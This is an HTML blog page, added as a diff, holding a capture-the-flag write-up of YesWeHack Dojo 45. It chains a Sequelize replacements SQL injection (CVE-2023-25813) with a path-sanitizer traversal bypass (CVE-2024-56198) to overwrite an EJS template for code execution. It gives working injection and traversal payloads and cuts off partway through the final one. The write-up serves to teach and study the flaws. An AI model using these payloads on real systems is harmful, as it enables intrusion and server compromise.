@@ -1,0 +1,523 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html
+  class="not-ready lg:text-base"
+  style="--bg: #faf8f1"
+  lang="en-us"
+  dir="ltr"
+>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1, shrink-to-fit=no"
+  />
+
+  
+  <title>Chainfection Write Up - Yeswehack Dojo 45 - Blog of MaxNTV(aka vu.nguyen)</title>
+
+  
+  <meta name="theme-color" />
+
+  
+  
+  
+  
+  <meta name="description" content="Summary
+Chained vulnerability: an SQL injection is used to bypass the verify/date checks, then a path-traversal/file-write lets the attacker place malicious content into /tmp/view/index.ejs; when the app renders that template, the injected code executes, resulting in RCE.
+A successful attack causes code execution, leading to the compromise of the server exposing sensitive/confidential data.
+Exploitation
+Use SQL injection to bypass the verify/updatedAt checks so user leet becomes selectable, update that user\u2019s attachment and write attacker-controlled content which resolves to /tmp/view/index.ejs, then trigger the template render to execute the injected code and achieve RCE." />
+  <meta name="author" content="Blog of MaxNTV(aka vu.nguyen)" />
+  
+
+  
+  
+  
+  
+  
+  
+  <link rel="preload stylesheet" as="style" href="http://localhost:1313/main.min.css" />
+
+  
+  
+  
+  
+  
+  <link rel="preload" as="image" href="http://localhost:1313/theme.png" />
+
+  
+  
+  
+  
+  <link rel="preload" as="image" href="https://www.gravatar.com/avatar/602329463d25982d5cfac02a40774ef1?s=160&amp;d=identicon" />
+  
+  
+
+  
+  
+  <link rel="preload" as="image" href="http://localhost:1313/github.svg" />
+  
+  
+
+  
+  
+  <script
+    defer
+    src="http://localhost:1313/highlight.min.js"
+    onload="hljs.initHighlightingOnLoad();"
+  ></script>
+  
+
+  
+  
+  
+
+  
+  <link
+    rel="icon"
+    href="http://localhost:1313/favicon.ico"
+  />
+  <link
+    rel="apple-touch-icon"
+    href="http://localhost:1313/apple-touch-icon.png"
+  />
+
+  
+  <meta name="generator" content="Hugo 0.152.2">
+
+  
+  
+  
+</head>
+
+  <body class="text-black duration-200 ease-out dark:text-white">
+    <header class="mx-auto flex h-[4.5rem] max-w-[--w] px-8 lg:justify-center">
+  <div class="relative z-50 ltr:mr-auto rtl:ml-auto flex items-center">
+    <a class="-translate-y-[1px] text-2xl font-medium" href="http://localhost:1313/"
+      >Blog of MaxNTV(aka vu.nguyen)</a
+    >
+    <div
+      class="btn-dark text-[0] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]"
+      role="button"
+      aria-label="Dark"
+    ></div>
+  </div>
+
+  <div
+    class="btn-menu relative z-50 ltr:-mr-8 rtl:-ml-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+    role="button"
+    aria-label="Menu"
+  ></div>
+
+  
+
+  <script>
+    
+    const htmlClass = document.documentElement.classList;
+    setTimeout(() => {
+      htmlClass.remove('not-ready');
+    }, 10);
+
+    
+    const btnMenu = document.querySelector('.btn-menu');
+    btnMenu.addEventListener('click', () => {
+      htmlClass.toggle('open');
+    });
+
+    
+    const metaTheme = document.querySelector('meta[name="theme-color"]');
+    const lightBg = '#faf8f1'.replace(/"/g, '');
+    const setDark = (isDark) => {
+      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
+      htmlClass[isDark ? 'add' : 'remove']('dark');
+      localStorage.setItem('dark', isDark);
+    };
+
+    
+    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
+    if (htmlClass.contains('dark')) {
+      setDark(true);
+    } else {
+      const darkVal = localStorage.getItem('dark');
+      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
+    }
+
+    
+    darkScheme.addEventListener('change', (event) => {
+      setDark(event.matches);
+    });
+
+    
+    const btnDark = document.querySelector('.btn-dark');
+    btnDark.addEventListener('click', () => {
+      setDark(localStorage.getItem('dark') !== 'true');
+    });
+  </script>
+
+  <div
+    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
+  >
+    
+    
+    <nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse">
+      
+      <a
+        class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal"
+        href="/contact/"
+        >Contact</a
+      >
+      
+    </nav>
+    
+
+    
+    <nav
+      class="mt-12 flex justify-center space-x-10 rtl:space-x-reverse dark:invert ltr:lg:ml-14 rtl:lg:mr-14 lg:mt-0 lg:items-center"
+    >
+      
+      <a
+        class="h-7 w-7 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./github.svg)"
+        href="https://github.com/maxntv24"
+        target="_blank"
+        rel="me"
+      >
+        github
+      </a>
+      
+    </nav>
+    
+  </div>
+</header>
+
+
+    <main
+      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-[--w] px-8 pb-16 pt-14 dark:prose-invert"
+    >
+      
+
+<article>
+  <header class="mb-14">
+    <h1 class="!my-0 pb-2.5">Chainfection Write Up - Yeswehack Dojo 45</h1>
+
+    
+    <div class="text-xs antialiased opacity-60">
+      
+      <time>Oct 30, 2025</time>
+      
+      
+      
+      
+    </div>
+    
+  </header>
+
+  <section><h2 id="summary">Summary</h2>
+<p>Chained vulnerability: an SQL injection is used to bypass the verify/date checks, then a path-traversal/file-write lets the attacker place malicious content into <strong>/tmp/view/index.ejs</strong>; when the app renders that template, the injected code executes, resulting in RCE.</p>
+<p>A successful attack causes code execution, leading to the compromise of the server exposing sensitive/confidential data.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Use SQL injection to bypass the <strong>verify/updatedAt</strong> checks so user <strong>leet</strong> becomes selectable, update that user\u2019s attachment and write attacker-controlled content which resolves to <strong>/tmp/view/index.ejs</strong>, then trigger the template render to execute the injected code and achieve RCE.</p>
+<h2 id="code-analysis">Code Analysis</h2>
+<h3 id="setup-code">Setup code</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#e6db74">`flag_</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">16</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;hex&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">.txt`</span>, <span style="color:#a6e22e">flag</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#e6db74">&#39;user/files/document.txt&#39;</span>, <span style="color:#e6db74">&#39;test&#39;</span>);
+</span></span></code></pre></div><ul>
+<li>Creates a flag file with a random name flag_<!-- raw HTML omitted -->.txt containing the secret flag.</li>
+<li>Also creates a helper file user/files/document.txt with the text test.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">Users</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sequelize</span>.<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#34;User&#34;</span>, {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">DataTypes</span>.<span style="color:#a6e22e">STRING</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">verify</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">DataTypes</span>.<span style="color:#a6e22e">BOOLEAN</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">attachment</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">DataTypes</span>.<span style="color:#a6e22e">STRING</span>,
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">init</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sequelize</span>.<span style="color:#a6e22e">sync</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">Users</span>.<span style="color:#a6e22e">create</span>({ <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;brumens&#34;</span>, <span style="color:#a6e22e">verify</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,  <span style="color:#a6e22e">attachment</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;document.txt&#34;</span> });
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">Users</span>.<span style="color:#a6e22e">create</span>({ <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;leet&#34;</span>,    <span style="color:#a6e22e">verify</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">attachment</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span> });
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>Defines a User table with fields: name, verify, and attachment.</li>
+<li>Two users are inserted:</li>
+<li>brumens -&gt; verified (verify: true), attachment = document.txt.</li>
+<li>leet -&gt; not verified (verify: false), no attachment.</li>
+</ul>
+<h3 id="challenge-code">Challenge code</h3>
+<h4 id="1-input-expected--validation">1. Input expected &amp; validation</h4>
+<ul>
+<li>What the code expects: a JSON string containing username, updatedat, attachment, and content.</li>
+<li>What getJsonInput does: parses the JSON and throws if any required key is missing or the JSON is invalid.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getJsonInput</span>(decodeURIComponent(<span style="color:#e6db74">&#34;&#34;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// getJsonInput checks:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// - parses JSON
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// - requires keys: &#34;username&#34;, &#34;updatedat&#34;, &#34;attachment&#34;, &#34;content&#34;
+</span></span></span></code></pre></div><ul>
+<li>Update attachment field for user id=2</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">Users</span>.<span style="color:#a6e22e">update</span>(
+</span></span><span style="display:flex;"><span>  { <span style="color:#a6e22e">attachment</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">attachment</span> },
+</span></span><span style="display:flex;"><span>  { <span style="color:#a6e22e">where</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span> } }
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><h4 id="2-select-a-user-with-mixed-literal--conditions">2. Select a user (with mixed literal + conditions)</h4>
+<ul>
+<li>the <strong>updatedAt</strong> date meets the strftime condition (literal with replacement),</li>
+<li><strong>name</strong> equals data.username, and</li>
+<li><strong>verify</strong> is true.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">Users</span>.<span style="color:#a6e22e">findOne</span>({
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">where</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>    [<span style="color:#a6e22e">Op</span>.<span style="color:#a6e22e">and</span>]<span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sequelize</span>.<span style="color:#a6e22e">literal</span>(<span style="color:#e6db74">`strftime(&#39;%Y-%m-%d&#39;, updatedAt) &gt;= :updatedat`</span>),
+</span></span><span style="display:flex;"><span>      { <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">username</span> },
+</span></span><span style="display:flex;"><span>      { <span style="color:#a6e22e">verify</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replacements</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">updatedat</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">updatedat</span> },
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><h4 id="3--build-file-path-and-write-content">3.- Build file path and write content</h4>
+<ul>
+<li>The code uses <strong>psanitize</strong> to sanitize user.attachment, builds a path under /tmp/user/files/, and writes data.content into that file</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`/tmp/user/files/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">psanitize</span>(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">attachment</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#a6e22e">file</span>, <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">content</span>)
+</span></span></code></pre></div><h4 id="4--render-the-template">4.- Render the template</h4>
+<ul>
+<li>What it does: loads /tmp/view/index.ejs and renders it with EJS.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">ejs</span>.<span style="color:#a6e22e">render</span>(<span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#39;/tmp/view/index.ejs&#39;</span>, <span style="color:#e6db74">&#34;utf-8&#34;</span>), { <span style="color:#a6e22e">filename</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">basename</span>(<span style="color:#a6e22e">filename</span>), <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">error</span> }))
+</span></span></code></pre></div><h3 id="thoughts">Thoughts</h3>
+<h3 id="1-path-traversal">1. Path Traversal</h3>
+<ul>
+<li>
+<p>I like tracing from sink back to source. As soon as I saw fs.writeFileSync(&hellip;) (file write sink) combined with ejs.render(&hellip;) (template render), I immediately suspected a path-traversal + file-write \u2192 template injection (EJS/EL) chain that can lead to RCE and reading the flag.</p>
+</li>
+<li>
+<p>However, the <strong>psanitize</strong> call appears to sanitize filenames and blocks straightforward path-traversal attempts.
+<img src="../image1.png" alt="alt text"></p>
+</li>
+<li>
+<p>Back to the setup code I noticed path-sanitizer is pinned to 2.0.0, which is vulnerable <a href="https://github.com/advisories/GHSA-94p5-r7cc-3rpr">CVE-2024-56198</a></p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">psanitize</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require_v</span>(<span style="color:#e6db74">&#34;path-sanitizer&#34;</span>, <span style="color:#e6db74">&#34;2.0.0&#34;</span>);
+</span></span></code></pre></div><h4 id="root-cause-and-analysisshort-with-code-notes">Root cause and analysis(short, with code notes)</h4>
+<p><img src="../image2.png" alt="alt text">
+Ref: <a href="https://github.com/cabraviva/path-sanitizer/commit/bb2e758">The commit</a></p>
+<h5 id="1-decode-step-turns-encoded-backslash-into-">1. Decode step turns encoded backslash into \:</h5>
+<ul>
+<li>So the payload <strong>..=%5c</strong> becomes <strong>..=\.</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">sanitizedPath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sanitizedPath</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/%5c/g</span>, <span style="color:#e6db74">&#39;\\\\&#39;</span>)  <span style="color:#75715e">// &#34;%5c&#34; -&gt; &#34;\\&#34;
+</span></span></span></code></pre></div><h5 id="2-not-allowed-chars-removal-strips-the--character">2. Not-allowed chars removal strips the <strong>=</strong> character:</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">//notAllowedRegEx: /:|\\$|!|&#39;|&#34;|@|\\+|**|\\||=/g    
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// (notAllowedRegEx includes &#39;=&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">sanitizedPath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sanitizedPath</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">notAllowedRegEx</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span></code></pre></div><h5 id="3-parent-directory-checks-were-too-naive-u2014-the-old-regex-looked-for-canonical-patterns-like--or-">3. Parent-directory checks were too naive \u2014 the old regex looked for canonical patterns like <strong>/../</strong> or <strong>\..\</strong></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">parentDirectoryRegEx</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/[\\/\\\\]\\.\\.[\\/\\\\]/g</span>
+</span></span></code></pre></div><h5 id="4-normalization-collapses-the-obfuscation-into-real-traversal">4. Normalization collapses the obfuscation into real traversal:</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">sanitizedPath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">normalize</span>(<span style="color:#a6e22e">sanitizedPath</span>)
+</span></span></code></pre></div><ul>
+<li>
+<p>path.normalize() (and the backslash\u2192slash replacements) will ultimately collapse <strong>..\</strong> into <strong>../</strong>, yielding a true traversal token. At that point the path resolves outside the intended base directory.</p>
+</li>
+<li>
+<p>With the attachment set to <strong>&quot;..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5ctmp/view/index.ejs&quot;</strong> the payload successfully performs path traversal and writes attacker-controlled content into <strong>/tmp/view/index.ejs</strong>.
+<img src="../image3.png" alt="alt text"></p>
+</li>
+</ul>
+<h3 id="2-sql-injection">2. SQL Injection</h3>
+<p>However, with the code below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getJsonInput</span>(decodeURIComponent(<span style="color:#e6db74">&#34;&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">Users</span>.<span style="color:#a6e22e">update</span>(
+</span></span><span style="display:flex;"><span>  { <span style="color:#a6e22e">attachment</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">attachment</span> },
+</span></span><span style="display:flex;"><span>  { <span style="color:#a6e22e">where</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span> } }
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Get user from database
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">Users</span>.<span style="color:#a6e22e">findOne</span>({
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">where</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>    [<span style="color:#a6e22e">Op</span>.<span style="color:#a6e22e">and</span>]<span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sequelize</span>.<span style="color:#a6e22e">literal</span>(<span style="color:#f92672">**</span><span style="color:#a6e22e">strftime</span>(<span style="color:#e6db74">&#39;%Y-%m-%d&#39;</span>, <span style="color:#a6e22e">updatedAt</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#f92672">:</span><span style="color:#a6e22e">updatedat</span><span style="color:#f92672">**</span>),
+</span></span><span style="display:flex;"><span>      { <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">username</span> },
+</span></span><span style="display:flex;"><span>      { <span style="color:#a6e22e">verify</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replacements</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">updatedat</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">updatedat</span> },
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#f92672">**</span><span style="color:#960050;background-color:#1e0010">/tmp/user/files/${psanitize(user.attachment)}**</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#a6e22e">file</span>, <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">content</span>)
+</span></span></code></pre></div><ul>
+<li>
+<p>Users.update(&hellip; where: { id: 2 }) writes the attachment value to the row with id = 2 (user leet). But the subsequent findOne only returns a record when name matches and verify === true. Since <strong>leet</strong> is created with<strong>verify: false</strong>, calling findOne with <strong>username = &ldquo;leet&rdquo;</strong> will return null (the verify condition fails), so user is null and fs.writeFileSync cannot run on <strong>user.attachment</strong>
+<img src="../image4.png" alt="alt text"></p>
+</li>
+<li>
+<p>Sequelize in the setup is pinned to 6.19.0:</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> {<span style="color:#a6e22e">Sequelize</span>, <span style="color:#a6e22e">DataTypes</span>, <span style="color:#a6e22e">Op</span>, <span style="color:#a6e22e">literal</span>} <span style="color:#f92672">=</span> <span style="color:#a6e22e">require_v</span>(<span style="color:#e6db74">&#34;sequelize&#34;</span>, <span style="color:#e6db74">&#34;6.19.0&#34;</span>);
+</span></span></code></pre></div><ul>
+<li>
+<p>This is significant because <a href="https://github.com/advisories/GHSA-wrh9-cjv3-2hpw">CVE-2023-25813</a> affects Sequelize versions prior to 6.19.1: a flaw in how replacements are injected into queries can lead to SQL injection, especially when replacements are used together with where/literal conditions.</p>
+</li>
+<li>
+<p>Underlying issue: the replacements mechanism was interpolated directly into the SQL string instead of being bound safely.</p>
+</li>
+<li>
+<p>When combined with where and literal(&hellip;), placeholders could be misapplied to other conditions. This caused unsafe string concatenation and opened the door to SQL injection.</p>
+</li>
+<li>
+<p>Raw SQL (parameterized form, as built from literal + conditions):</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> <span style="color:#e6db74">&#34;Users&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> strftime(<span style="color:#e6db74">&#39;%Y-%m-%d&#39;</span>, updatedAt) <span style="color:#f92672">&gt;=</span> :updatedat
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">AND</span> <span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#f92672">=</span> :username
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">AND</span> <span style="color:#e6db74">&#34;verify&#34;</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span></code></pre></div><ul>
+<li>With my payload  {&ldquo;username&rdquo;: &ldquo;:updatedat&rdquo;,&ldquo;updatedat&rdquo;: &ldquo;OR id=2 OR&rdquo;}, then would inject replacements in it, which resulted in this:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> <span style="color:#e6db74">&#34;Users&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> strftime(<span style="color:#e6db74">&#39;%Y-%m-%d&#39;</span>, updatedAt) <span style="color:#f92672">&gt;=</span> <span style="color:#e6db74">&#39;OR id=2 OR&#39;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">AND</span> <span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">OR</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">OR</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#e6db74">&#34;verify&#34;</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span></code></pre></div><ul>
+<li>In SQL, it evaluates AND before OR</li>
+<li>The expression above is therefore grouped roughly as:</li>
+</ul>
+<pre tabindex="0"><code>(
+  (strftime(...) &gt;= &#39;OR id=2 OR&#39; AND &#34;name&#34; = &#39;&#39;)
+  OR id = 2
+  OR (&#39;&#39; AND &#34;verify&#34; = 1)
+)
+</code></pre><ul>
+<li>The OR id = 2 term is independent of the failing AND clauses. If a row has id = 2, that OR term is true, so the whole WHERE becomes true and the row is returned \u2014 even though the name/verify checks are effectively broken by the injection.</li>
+<li>the injected OR id=2 short-circuits the WHERE logic because of operator precedence (AND binds tighter than OR), so matching id=2 is sufficient for selection.</li>
+</ul>
+<h3 id="3-final-exploit">3. Final Exploit</h3>
+<h4 id="payload">Payload</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;:updatedat&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;updatedat&#34;</span>: <span style="color:#e6db74">&#34;OR id=2 OR&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;attachment&#34;</span>: <span style="color:#e6db74">&#34;..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5ctmp/view/index.ejs&#34;</span>,
